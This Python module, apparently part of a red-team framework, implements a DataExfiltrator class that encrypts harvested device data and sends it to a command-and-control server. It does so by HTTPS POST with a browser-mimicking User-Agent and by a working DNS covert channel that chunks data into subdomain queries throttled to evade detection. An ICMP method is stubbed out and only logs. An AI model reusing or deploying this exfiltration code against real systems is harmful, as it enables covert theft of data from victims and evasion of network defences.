import logging
import json
import base64
import asyncio
import socket
from typing import Dict, Any, List

from redteam_framework.core.logger import logger

# Optional imports
try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False
    logger.warning("aiohttp not installed. Web interactions will be limited.")

try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logger.warning("Scapy not installed. Exfiltration options limited.")

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False
    logger.warning("cryptography not installed. Data encryption will be disabled.")


class DataExfiltrator:
    """
    Handles secure exfiltration of categorized data to C2.
    """
    
    def __init__(self, config: Dict[str, Any]):
        """
        Initialize exfiltration manager with configuration.
        """
        self.config = config
        self.c2_url = config.get('c2_url', 'http://127.0.0.1:8080/exfiltrate')
        self.encryption_key = config.get('encryption_key', 'default-key-32-bytes-32bytes!!')
        self.method = config.get('method', 'https')
        self.proxy_url = config.get('proxy_url', None)
        self.session = None

    async def initialize_session(self):
        """Initialize aiohttp session with optional proxy."""
        if not AIOHTTP_AVAILABLE:
            return
            
        if self.proxy_url:
            connector = aiohttp.TCPConnector()
            timeout = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                trust_env=True  # Use proxy from environment
            )
        else:
            self.session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30))

    async def close(self):
        """Close the aiohttp session."""
        if self.session:
            await self.session.close()

    def encrypt_data(self, data: Dict[str, Any]) -> str:
        """Encrypt data using Fernet (AES) before exfiltration."""
        if not CRYPTOGRAPHY_AVAILABLE:
            logger.warning("Cryptography module not available. Sending data unencrypted.")
            return base64.b64encode(json.dumps(data).encode()).decode()
            
        try:
            # Derive key from password
            password = self.encryption_key.encode()
            salt = b'salt_32_bytes_long_for_pbkdf2_'  # In real use, use random salt
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(password))
            f = Fernet(key)
            serialized_data = json.dumps(data).encode()
            encrypted_data = f.encrypt(serialized_data)
            return base64.b64encode(encrypted_data).decode()
        except Exception as e:
            logger.error(f"Encryption failed: {e}")
            # Fallback: send unencrypted if encryption fails (not recommended in prod)
            return json.dumps(data)

    async def exfiltrate(self, device_info: Dict[str, Any], categorized_data: Dict[str, List[Any]]):
        """
        Exfiltrate categorized data to C2 server using configured method.
        """
        if not self.session:
            await self.initialize_session()

        payload = {
            'device_info': device_info,
            'categorized_data': categorized_data,
            'timestamp': device_info.get('timestamp', 'unknown')
        }

        # Encrypt the payload
        encrypted_payload = self.encrypt_data(payload)

        if self.method == 'https':
            await self.exfiltrate_via_https(encrypted_payload)
        elif self.method == 'dns':
            await self.exfiltrate_via_dns(encrypted_payload)
        elif self.method == 'icmp':
            await self.exfiltrate_via_icmp(encrypted_payload)
        else:
            logger.warning(f"Unknown exfiltration method: {self.method}. Defaulting to HTTPS.")
            await self.exfiltrate_via_https(encrypted_payload)

    async def exfiltrate_via_https(self, encrypted_payload: str):
        """Exfiltrate data via HTTPS POST request."""
        if not AIOHTTP_AVAILABLE:
            logger.error("aiohttp not available, cannot perform HTTPS exfiltration.")
            return
            
        try:
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'  # Mimic browser
            }
            data = json.dumps({'data': encrypted_payload})

            async with self.session.post(self.c2_url, data=data, headers=headers) as response:
                if response.status == 200:
                    logger.info(f"Data successfully exfiltrated via HTTPS to {self.c2_url}")
                else:
                    logger.error(f"HTTPS exfiltration failed with status {response.status}")
        except Exception as e:
            logger.error(f"HTTPS exfiltration error: {e}")

    async def exfiltrate_via_dns(self, encrypted_payload: str):
        """Exfiltrate data via DNS queries (covert channel)."""
        try:
            # Split data into chunks of 63 chars (max subdomain length)
            chunk_size = 63
            chunks = [encrypted_payload[i:i+chunk_size] for i in range(0, len(encrypted_payload), chunk_size)]
            c2_domain = self.c2_url.replace('http://', '').replace('https://', '').split('/')[0]

            for i, chunk in enumerate(chunks):
                subdomain = f"{chunk}.{c2_domain}"
                try:
                    socket.gethostbyname(subdomain)  # This sends a DNS query
                    await asyncio.sleep(0.5)  # Throttle to avoid detection
                except:
                    pass  # Ignore DNS resolution failure

            logger.info(f"Data successfully exfiltrated via DNS to {c2_domain}")
        except Exception as e:
            logger.error(f"DNS exfiltration error: {e}")

    async def exfiltrate_via_icmp(self, encrypted_payload: str):
        """Exfiltrate data via ICMP packets (requires root privileges)."""
        try:
            if not SCAPY_AVAILABLE:
                logger.warning("Scapy not available, skipping ICMP exfiltration.")
                return
                
            # This is a simplified example, real ICMP exfil requires raw sockets
            # and is OS-dependent. We'll simulate the concept.
            target_ip = self.c2_url.replace('http://', '').replace('https://', '').split('/')[0]
            
            # In a real scenario, you'd craft ICMP packets with the payload
            logger.info(f"ICMP exfiltration to {target_ip} would send: {encrypted_payload[:50]}...")
            
        except ImportError:
            logger.warning("Scapy not available, skipping ICMP exfiltration.")
        except Exception as e:
            logger.error(f"ICMP exfiltration error: {e}")
